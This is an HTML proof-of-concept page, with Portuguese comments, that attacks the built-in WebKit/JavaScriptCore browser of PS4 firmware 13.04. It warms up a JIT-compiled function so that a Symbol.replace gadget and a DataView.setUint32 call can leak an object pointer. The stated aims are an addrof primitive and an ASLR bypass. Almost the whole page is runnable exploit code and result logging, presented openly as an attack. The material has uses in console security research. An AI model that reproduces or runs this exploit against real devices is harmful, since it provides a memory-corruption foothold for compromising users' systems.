
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PoC #4 — Native Sink (DataView Type Confusion)</title>
<style>
  body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
  h2 { color: #d2f; }
  pre { background: #1e1e1e; padding: 16px; border-left: 3px solid #d2f; white-space: pre-wrap; }
  .ok    { color: #4f4; }
  .alert { color: #f44; font-weight: bold; }
  .info  { color: #aaa; }
  .warn  { color: #fa4; }
  button { background: #d2f; color: #fff; border: none; padding: 10px 24px;
           font-size: 14px; font-weight: bold; cursor: pointer; margin: 4px; }
  #log { margin-top: 10px; display: block; }
</style>
</head>
<body>

<h2>PoC #4 — Vazamento de Ponteiro via C++ Native Sink</h2>
<pre>
Target   : PS4 Firmware 13.04 — Built-in WebKit/JSC browser
Estratégia: Contornar os Write Barriers do JS injetando a primitiva de
            Type Confusion diretamente em uma chamada de API nativa (DataView).
            O objetivo é forçar o backend C++ a fazer um blind cast do JSValue.
</pre>

<button onclick="runNativeSinkExploit()">▶ EXECUTAR POC (DataView Sink)</button>
<pre id="log">Pressione o botão para atacar a API nativa.</pre>

<script>
var log = document.getElementById('log');
function line(cls, msg) {
  var s = document.createElement('span');
  s.className = cls;
  s.textContent = msg + '\n';
  log.appendChild(s);
}
function info(m)  { line('info',  '[INFO]  ' + m); }
function ok(m)    { line('ok',    '[OK]    ' + m); }
function alert_(m){ line('alert', '[VULN]  ' + m); }
function warn(m)  { line('warn',  '[WARN]  ' + m); }
function sep()    { line('info',  '─'.repeat(60)); }

var WARMUP = 150000; // Warmup altíssimo para garantir FTL (Faster Than Light) JIT

function buildGadget(phase, payloadRef) {
  return {
    [Symbol.replace]: function(str) {
      if (phase[0] === 'warmup') return str; 
      // Payload perfeito encapsulado
      return { length: payloadRef[0] }; 
    }
  };
}

function strLen(s, handler) {
  return s.replace(handler, '').length;
}

// O Sink Nativo.
// A otimização JIT fará o bind direto para a implementação C++ do setUint32.
function storeInNative(base, handler, view) {
  // view.setUint32(byteOffset, value, littleEndian)
  view.setUint32(0, strLen(base, handler), true);
}

async function runNativeSinkExploit() {
  log.textContent = '';
  info('=== INICIANDO ATAQUE EM SINK NATIVO (C++) ===');
  sep();

  var phase = ['warmup'];
  var payload = [0];
  var handler = buildGadget(phase, payload);
  var base = 'test string';

  // Buffer de 8 bytes para o DataView
  var buffer = new ArrayBuffer(8);
  var dataView = new DataView(buffer);

  info('1. Realizando JIT Warmup Extremo (' + WARMUP + ' iterações)...');
  info('   Isso força o JIT a linkar a função C++ diretamente.');
  for (var w = 0; w < WARMUP; w++) {
    storeInNative(base, handler, dataView);
  }
  info('Warmup concluído.');
  
  var warmupResult = dataView.getUint32(0, true);
  info('Estado do DataView após warmup: ' + warmupResult);
  
  if (warmupResult !== 11) { 
      warn('Falha no warmup: DataView não recebeu o tamanho da string.');
      return;
  }

  sep();
  info('2. Iniciando Attack Phase...');
  
  var victimObject = { magic: 0x1337BEEF, marker: "LEANDRO_NATIVE" };
  payload[0] = victimObject;
  phase[0] = 'attack';
  
  try {
    storeInNative(base, handler, dataView);
  } catch(e) {
    warn('O JIT inseriu uma checagem de segurança antes de chamar o C++: ' + e.message);
    return;
  }
  
  phase[0] = 'warmup';

  sep();
  info('3. Inspecionando a Memória Nativa...');
  
  // Lendo o que o C++ gravou no nosso ArrayBuffer
  var leakedLower32 = dataView.getUint32(0, true);
  var hexLeak = "0x" + leakedLower32.toString(16).padStart(8, '0');
  
  info('Valor raw (Uint32) gravado pelo C++: ' + leakedLower32);

  // Análise dos Resultados
  if (leakedLower32 === 11) {
      warn('O C++ rejeitou a gravação silenciosamente (manteve o 11).');
  } else if (leakedLower32 === 0) {
      warn('O motor nativo executou ToNumber(object) -> NaN -> 0.');
      warn('O C++ não confiou cegamente no JIT e forçou a coerção segura.');
  } else {
      alert_('VULNERABILIDADE CRÍTICA CONFIRMADA (ADDROF)!');
      alert_('O C++ confiou no tipo errado e gravou os bits do ponteiro.');
      alert_('Lower 32-bits do ponteiro JSValue: ' + hexLeak);
      info('');
      info('Se este valor mudar a cada execução do PS4, você tem um bypass de ASLR rodando.');
  }
}
</script>
</body>
</html>
